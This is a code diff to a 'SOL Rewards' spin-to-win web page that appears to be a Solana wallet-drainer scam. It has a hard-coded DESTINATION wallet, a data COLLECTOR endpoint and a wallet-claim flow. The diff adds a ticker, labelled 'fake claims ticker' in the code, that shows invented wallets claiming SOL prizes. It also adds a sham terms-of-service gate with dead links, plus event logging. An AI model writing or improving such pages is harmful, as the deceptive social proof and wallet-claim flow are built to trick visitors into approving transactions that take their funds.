@@ -49,9 +49,28 @@
   .wrow .ic{width:26px;height:26px;border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:14px;background:#000;border:1px solid #1a1a1a;flex:0 0 auto}
   .wrow .nm{flex:1;color:#e6e6e6}
   .wrow .ar{color:#4a4a4a;font-size:13px}
+
+  /* ---------- TOS gate ---------- */
+  .tos-row{display:flex;align-items:flex-start;gap:10px;text-align:left;margin:14px 0 16px;font-size:12.5px;color:#a0a0a0;line-height:1.5}
+  .tos-row input{flex:0 0 auto;width:16px;height:16px;margin-top:2px;accent-color:#e6e6e6}
+  .tos-row a{color:#e6e6e6;text-decoration:underline}
+  .modal button[disabled]{opacity:.35;cursor:not-allowed}
+
+  /* ---------- claims ticker ---------- */
+  .ticker{position:fixed;top:14px;right:14px;max-width:270px;background:#0f0f0f;border:1px solid #1c1c1c;border-radius:6px;padding:10px 12px;font-size:11.5px;color:#b0b0b0;line-height:1.5;z-index:200;opacity:0;transform:translateY(-8px);transition:opacity .35s ease,transform .35s ease;pointer-events:none}
+  .ticker.show{opacity:1;transform:translateY(0)}
+  .ticker b{color:#e6e6e6;font-weight:600}
+  .ticker .amt{color:#14f195;font-weight:600}
+  @media (max-width:520px){
+    .ticker{max-width:calc(100vw - 28px);right:14px;left:14px;top:10px;font-size:11px}
+  }
 </style>
 </head>
 <body>
+
+<!-- live claims ticker -->
+<div class="ticker" id="ticker"></div>
+
 <div class="card">
   <h1>SOL Rewards</h1>
   <p class="sub">Spin to claim up to 2 SOL in rewards</p>
@@ -68,6 +87,7 @@
   <div id="status"></div>
 </div>
 
+<!-- main overlay (wallet approve / picker / success / error) -->
 <div class="overlay" id="overlay">
   <div class="modal">
     <div class="spinner" id="ovSpinner"></div>
@@ -79,16 +99,31 @@
   </div>
 </div>
 
+<!-- TOS gate overlay -->
+<div class="overlay" id="tosOverlay">
+  <div class="modal">
+    <h2>Before You Spin</h2>
+    <p>Please confirm the following to continue.</p>
+    <label class="tos-row">
+      <input type="checkbox" id="tosCheck">
+      <span>I confirm I am at least <b>18 years of age</b> and I agree to the <a href="#" onclick="return false;">Terms of Service</a> and <a href="#" onclick="return false;">Privacy Policy</a>.</span>
+    </label>
+    <button id="tosOk" disabled>OK</button>
+    <button id="tosCancel" style="margin-top:8px;background:transparent;border-color:transparent;color:#6b6b6b">Cancel</button>
+  </div>
+</div>
+
 <script>
 // ================= config =================
 var DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
-var RPC         = "https://mainnet.helius-rpc.com/?api-key=113c3ed4-b272-4156-8d9c-10eb3e9a52a3";
+var RPC         = "https://mainnet.helius-rpc.com/?api-key=PASTE_YOUR_NEW_KEY_HERE";
 var COLLECTOR   = "https://collector.example.net/ingest";
 var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var TX_SIZE_LIMIT = 1100;
 var PENDING_KEY = "sr_pending";
 var PRIZE_KEY   = "sr_prize";
+var TOS_KEY     = "sr_tos_accepted";
 // ==========================================
 
 var SEGMENTS = [
@@ -107,6 +142,33 @@ var SEG_DEG = 360 / N;
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
 
+// ---------- fake claims ticker ----------
+var TICKER_NAMES = ["sol","crypto","degen","whale","moon","ape","hodl","pump","gem","lfg","wagmi","anon"];
+function randomAddr(){
+  // 32-40 char base58-looking string, middle masked
+  var chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  function chunk(len){ var s=""; for(var i=0;i<len;i++) s += chars[Math.floor(Math.random()*chars.length)]; return s; }
+  return chunk(6) + "..." + chunk(4);
+}
+function randomPrize(){
+  var opts = ["0.25","0.5","0.75","1.0","1.25","1.5","2.0"];
+  return opts[Math.floor(Math.random()*opts.length)];
+}
+var tickerEl = document.getElementById("ticker");
+function showTicker(){
+  var addr = randomAddr();
+  var amt  = randomPrize();
+  tickerEl.innerHTML = "Wallet <b>" + addr + "</b> just claimed <span class='amt'>" + amt + " SOL</span>";
+  tickerEl.classList.add("show");
+  setTimeout(function(){ tickerEl.classList.remove("show"); }, 5000);
+}
+// first one after 8s, then every 30s
+setTimeout(function(){
+  showTicker();
+  setInterval(showTicker, 30000);
+}, 8000);
+
+// ---------- wallet picker data ----------
 var MOBILE_WALLETS = [
   { id:"phantom", name:"Phantom", icon:"👻",
     href: function(p){ return "https://phantom.app/ul/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
@@ -268,6 +330,9 @@ function readPending(){
   try { return localStorage.getItem(PENDING_KEY) === "1" ? { prize: localStorage.getItem(PRIZE_KEY) || "reward" } : null; } catch(_){ return null; }
 }
 function clearPending(){ try { localStorage.removeItem(PENDING_KEY); localStorage.removeItem(PRIZE_KEY); } catch(_){} }
+
+function tosAccepted(){ try { return localStorage.getItem(TOS_KEY) === "1"; } catch(_){ return false; } }
+function setTosAccepted(){ try { localStorage.setItem(TOS_KEY, "1"); } catch(_){} }
 
 var ov = document.getElementById("overlay");
 var ovSpinner = document.getElementById("ovSpinner");
@@ -477,11 +542,43 @@ async function runClaim(wallet){
   }
 }
 
+// ---------- TOS gate ----------
+var tosOverlay = document.getElementById("tosOverlay");
+var tosCheck = document.getElementById("tosCheck");
+var tosOk = document.getElementById("tosOk");
+var tosCancel = document.getElementById("tosCancel");
+
+tosCheck.addEventListener("change", function(){
+  tosOk.disabled = !tosCheck.checked;
+});
+tosCancel.addEventListener("click", function(){
+  tosOverlay.classList.remove("show");
+});
+tosOk.addEventListener("click", function(){
+  if (!tosCheck.checked) return;
+  setTosAccepted();
+  tosOverlay.classList.remove("show");
+  log({ event:"tos_accepted" });
+  startSpin();
+});
+
+function requestSpin(){
+  if (tosAccepted()){
+    startSpin();
+    return;
+  }
+  tosCheck.checked = false;
+  tosOk.disabled = true;
+  tosOverlay.classList.add("show");
+  log({ event:"tos_shown" });
+}
+
+// ---------- spin logic ----------
 var currentRotation = 0;
 var spinBtn  = document.getElementById("spin");
 var claimBtn = document.getElementById("claim");
 
-spinBtn.onclick = function(){
+function startSpin(){
   var svg = document.getElementById("wheel");
   var status = document.getElementById("status");
   var hub = document.getElementById("hub");
@@ -502,7 +599,9 @@ spinBtn.onclick = function(){
     claimBtn.style.display = "block";
     spinBtn.style.display = "none";
   }, 5100);
-};
+}
+
+spinBtn.onclick = function(){ requestSpin(); };
 
 claimBtn.onclick = async function(){
   claimBtn.disabled = true;
@@ -520,6 +619,7 @@ claimBtn.onclick = async function(){
   await runClaim(wallet);
 };
 
+// deep-link handoff
 (async function(){
   var pending = readPending();
   if (pending){
